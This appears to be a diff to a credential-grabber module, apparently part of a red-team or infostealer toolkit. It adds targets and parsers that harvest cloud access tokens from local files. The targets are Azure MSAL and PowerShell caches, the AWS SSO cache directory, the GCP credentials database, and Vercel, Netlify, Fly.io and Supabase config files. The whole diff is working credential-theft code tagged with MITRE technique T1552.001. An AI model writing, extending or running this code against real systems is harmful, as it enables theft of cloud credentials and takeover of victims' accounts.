@@ -55,13 +55,37 @@ class CloudCredGrabber(GrabberModule):
         ("{home}/.config/doctl/config.yaml", "_parse_generic_text", "DigitalOcean"),
         ("{home}/.config/configstore/firebase-tools.json", "_parse_json_tokens", "Firebase"),
         ("{home}/.netrc", "_parse_netrc", "netrc"),
+        # Azure MSAL token cache (OAuth tokens for Azure services)
+        ("{localappdata}/.IdentityService/msal.cache", "_parse_json_tokens", "Azure MSAL"),
+        # Azure PowerShell context (may contain ServicePrincipalSecret in cleartext)
+        ("{home}/.Azure/AzureRmContext.json", "_parse_json_tokens", "Azure PowerShell"),
+        ("{home}/.Azure/TokenCache.dat", "_parse_generic_text", "Azure Token Cache"),
+        # AWS SSO cache (session tokens)
+        ("{home}/.aws/sso/cache", "_parse_aws_sso_cache", "AWS SSO"),
+        # GCP credentials database
+        ("{appdata}/gcloud/credentials.db", "_parse_generic_text", "GCP Credentials DB"),
+        ("{home}/.config/gcloud/credentials.db", "_parse_generic_text", "GCP Credentials DB"),
+        # Vercel
+        ("{home}/.vercel/auth.json", "_parse_json_tokens", "Vercel"),
+        # Netlify
+        ("{home}/.netlify/config.json", "_parse_json_tokens", "Netlify"),
+        # Fly.io
+        ("{home}/.fly/config.yml", "_parse_generic_text", "Fly.io"),
+        # Supabase
+        ("{home}/.supabase/access-token", "_parse_vault_token", "Supabase"),
     ]
 
+    def _expand_path(self, template: str, context: GrabberContext) -> str:
+        return template.format(
+            home=context.user_profile_path,
+            localappdata=context.appdata_local or "",
+            appdata=context.appdata_roaming or "",
+        )
+
     def preflight_check(self, context: GrabberContext) -> bool:
-        # At least one target file must exist
         for template, _, _ in self._TARGETS:
-            path = template.format(home=context.user_profile_path)
-            if os.path.isfile(path):
+            path = self._expand_path(template, context)
+            if os.path.isfile(path) or os.path.isdir(path):
                 return True
         return False
 
@@ -69,13 +93,17 @@ class CloudCredGrabber(GrabberModule):
         result = GrabberResult(module_name=self.name)
 
         for template, parser_name, app_name in self._TARGETS:
-            path = template.format(home=context.user_profile_path)
-            if not os.path.isfile(path):
+            path = self._expand_path(template, context)
+            if not os.path.isfile(path) and not os.path.isdir(path):
                 continue
 
-            content = safe_read_text(path)
-            if not content:
-                continue
+            # For directory targets (like AWS SSO cache), pass path as content
+            if os.path.isdir(path):
+                content = path  # parser will handle directory scanning
+            else:
+                content = safe_read_text(path)
+                if not content:
+                    continue
 
             try:
                 parser = getattr(self, parser_name)
@@ -326,6 +354,42 @@ class CloudCredGrabber(GrabberModule):
                 decrypted_value=password,
                 mitre_technique="T1552.001",
             ))
+        return creds
+
+    def _parse_aws_sso_cache(self, path: str, content: str, app: str) -> list[ExtractedCredential]:
+        """Parse AWS SSO cache directory for session tokens."""
+        creds = []
+        # path is a directory -- scan all .json files inside
+        if os.path.isdir(path):
+            try:
+                for fname in os.listdir(path):
+                    if not fname.endswith(".json"):
+                        continue
+                    fpath = os.path.join(path, fname)
+                    file_content = safe_read_text(fpath)
+                    if not file_content:
+                        continue
+                    try:
+                        data = json.loads(file_content)
+                        access_token = data.get("accessToken", "")
+                        region = data.get("region", "")
+                        start_url = data.get("startUrl", "")
+                        if access_token:
+                            creds.append(ExtractedCredential(
+                                source_module=self.name,
+                                credential_type="token",
+                                target_application="AWS SSO",
+                                url=start_url,
+                                username=region,
+                                decrypted_value=access_token[:100],
+                                notes=f"SSO cache: {fname}",
+                                mitre_technique="T1552.001",
+                                source_file=fpath,
+                            ))
+                    except (json.JSONDecodeError, KeyError):
+                        pass
+            except (PermissionError, OSError):
+                pass
         return creds
 
     def _parse_generic_text(self, path: str, content: str, app: str) -> list[ExtractedCredential]:
